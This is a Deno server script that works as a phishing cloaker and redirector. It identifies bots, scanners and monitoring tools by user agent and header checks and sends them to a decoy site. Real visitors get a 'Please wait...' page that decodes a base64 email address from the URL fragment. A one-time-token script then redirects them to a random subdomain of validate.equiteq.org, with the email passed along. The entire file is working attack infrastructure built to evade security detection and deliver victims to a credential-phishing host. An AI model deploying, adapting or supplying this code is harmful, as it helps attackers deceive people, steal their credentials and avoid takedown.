const PORT = Number(Deno.env.get("PORT") || 8080);
const DECOY_URL = "https://seeking.com";
const TOKEN_TTL_MS = 30_000;
const tokens = new Map<string, number>();

function randomString(len: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let s = "";
  const bytes = crypto.getRandomValues(new Uint8Array(len));
  for (let i = 0; i < len; i++) s += chars[bytes[i] % chars.length];
  return s;
}

function isBot(userAgent: string): boolean {
  const bots = [
    "bot", "crawler", "spider", "curl", "wget", "python", "java", "perl",
    "headless", "phantom", "selenium", "puppeteer", "playwright", "webdriver",
    "postman", "httpie", "axios", "pingdom", "uptimerobot", "monitor"
  ];
  const ua = userAgent.toLowerCase();
  return bots.some((b) => ua.includes(b)) || ua.length < 20;
}

function missingHeaders(headers: Headers): boolean {
  return (
    !headers.get("accept") ||
    !headers.get("accept-language") ||
    !headers.get("accept-encoding")
  );
}

setInterval(() => {
  const now = Date.now();
  for (const [t, exp] of tokens.entries()) {
    if (exp < now) tokens.delete(t);
  }
}, 10_000);

Deno.serve({ port: PORT }, (req: Request): Response => {
  try {
    const url = new URL(req.url);
    const headers = req.headers;
    const ua = (headers.get("user-agent") || "").toLowerCase();
    const cookies = headers.get("cookie") || "";

    if (isBot(ua) || missingHeaders(headers)) {
      return Response.redirect(DECOY_URL, 302);
    }

    if (url.pathname.endsWith(".js")) {
      const noCookie = !cookies.includes("_v=1");
      const noReferer = !headers.get("referer");
      const secFetchDest = headers.get("sec-fetch-dest") || "";
      const wrongSecFetch = secFetchDest !== "script";
      const token = url.searchParams.get("t");
      const validToken = token && tokens.has(token);
      if (validToken) tokens.delete(token);

      if (noCookie || noReferer || wrongSecFetch || !validToken) {
        return Response.redirect(DECOY_URL, 302);
      }

      const email = url.searchParams.get("email") || "";
      const currentPath = url.searchParams.get("p") || "/";
      const queryString = url.searchParams.get("q") || "";
      const sub = randomString(5);
      const destination =
        `https://details${sub}.validate.equiteq.org${currentPath}?q=a` +
        `${queryString ? "&" + queryString : ""}` +
        `${email ? "&email=" + encodeURIComponent(email) : ""}`;

      const js = `window.location.replace('${destination}');`;

      return new Response(js, {
        headers: {
          "Content-Type": "application/javascript",
          "Cache-Control": "no-store, no-cache, must-revalidate, private",
        },
      });
    }

    const randomName = randomString(12);
    const token = randomString(16);
    tokens.set(token, Date.now() + TOKEN_TTL_MS);

    const scriptUrl =
      `/${randomName}.js?p=${encodeURIComponent(url.pathname)}` +
      `&q=${encodeURIComponent(url.search.substring(1))}` +
      `&t=${token}`;

    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Please wait...</title>
</head>
<body>
<script>
const cleanedHash = location.hash.slice(1);
const match = cleanedHash.match(/Family=([A-Za-z0-9+/=]+)/);
let decodedEmail = "";
if (match && match[1]) { try { decodedEmail = atob(match[1]); } catch(e){} }
const s = document.createElement("script");
s.src = "${scriptUrl}&email=" + encodeURIComponent(decodedEmail);
document.body.appendChild(s);
</script>
</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: {
        "Content-Type": "text/html; charset=utf-8",
        "Cache-Control": "no-store, no-cache, must-revalidate, private",
        "Set-Cookie": "_v=1; Path=/; HttpOnly; SameSite=Strict; Max-Age=30",
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
      },
    });
  } catch {
    return new Response("Error", { status: 500 });
  }
});
